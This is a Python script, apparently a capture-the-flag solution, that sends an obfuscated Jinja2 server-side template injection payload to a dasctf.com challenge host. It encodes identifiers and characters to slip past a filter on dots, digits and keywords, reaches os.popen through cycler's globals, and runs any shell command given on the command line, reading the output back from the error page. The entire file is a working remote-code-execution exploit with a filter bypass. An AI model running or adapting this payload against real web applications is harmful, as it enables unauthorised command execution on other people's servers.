#!/usr/bin/env python3
import html
import re
import sys
import urllib.parse
import urllib.request
import urllib.error


TARGET = "http://2273095efcf1270253338a5c.http-ctf2.dasctf.com"


def word(value):
    if not value.replace("_", "a").isalpha():
        raise ValueError(f"not an identifier-compatible word: {value!r}")
    return f"(dict({value}=x)|first)"


def attr(value, name):
    return f"(({value})|attr({word(name)}))"


def call(value, argument=""):
    return f"({value})({argument})"


def number(value):
    if value < 1:
        raise ValueError("positive integers only")
    return f"({word('a' * value)}|length)"


globals_obj = attr(attr("cycler", "__init__"), "__globals__")
globals_get = attr(globals_obj, "__getitem__")
builtins_obj = call(globals_get, word("__builtins__"))
builtins_get = attr(builtins_obj, "__getitem__")
chr_func = call(builtins_get, word("chr"))
import_func = call(builtins_get, word("__import__"))
sys_obj = call(import_func, word("sys"))
modules_obj = attr(sys_obj, "modules")
pop_func = attr(modules_obj, "pop")
restore_subprocess = call(pop_func, word("subprocess"))
os_obj = call(globals_get, word("os"))
popen_func = attr(os_obj, "popen")


def command_expr(command):
    pieces = re.findall(r"[A-Za-z_]+|.", command, re.S)
    encoded = []
    for piece in pieces:
        if re.fullmatch(r"[A-Za-z_]+", piece):
            encoded.append(word(piece))
        else:
            encoded.append(call(chr_func, number(ord(piece))))
    return "~".join(encoded)


def payload(command):
    pipe = call(popen_func, command_expr(command))
    output = call(attr(pipe, "read"))
    return "{{(" + restore_subprocess + "," + output + ")|last}}"


def main():
    command = " ".join(sys.argv[1:]) if len(sys.argv) > 1 else "id"
    expression = payload(command)
    assert not re.search(r"request|%|\.|join|\d", expression)
    url = TARGET + "/" + urllib.parse.quote(expression, safe="")
    try:
        response = urllib.request.urlopen(url, timeout=40)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        body = response.read().decode("utf-8", "replace")
    title = re.search(r"<title>Error 404 - (.*?) Not Found!</title>", body, re.S)
    print(html.unescape(title.group(1)) if title else body)


if __name__ == "__main__":
    main()
